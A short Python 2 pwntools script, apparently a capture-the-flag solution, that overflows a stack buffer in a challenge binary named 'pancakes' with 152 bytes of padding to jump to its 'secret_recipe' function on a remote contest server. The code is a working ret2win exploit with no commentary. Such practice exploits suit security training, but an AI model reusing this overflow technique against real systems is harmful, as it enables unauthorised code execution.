#!/usr/bin/env python2

from pwn import *
context(arch='amd64', os='linux')

def pwn():

    e = ELF("./pancakes")
    ret2winaddr = p64(e.symbols["secret_recipe"])
    #ret2winaddr = p64(0x40070b)

    info("%#x target", e.symbols.secret_recipe)

    #io = process('./pancakes')
    io = remote('jh2i.com', 50021)
    #io = remote('asia.pwn.zh3r0.ml', 3456)
    #io = remote('us.zh3r0.ml', 3456)
    print(io.recvuntil("How many pancakes do you want?"))

    buf = '\x90' * 152
    io.sendline(buf + ret2winaddr + "\n")
    print(io.recvall())
    io.interactive()

if __name__ == '__main__':
    pwn()
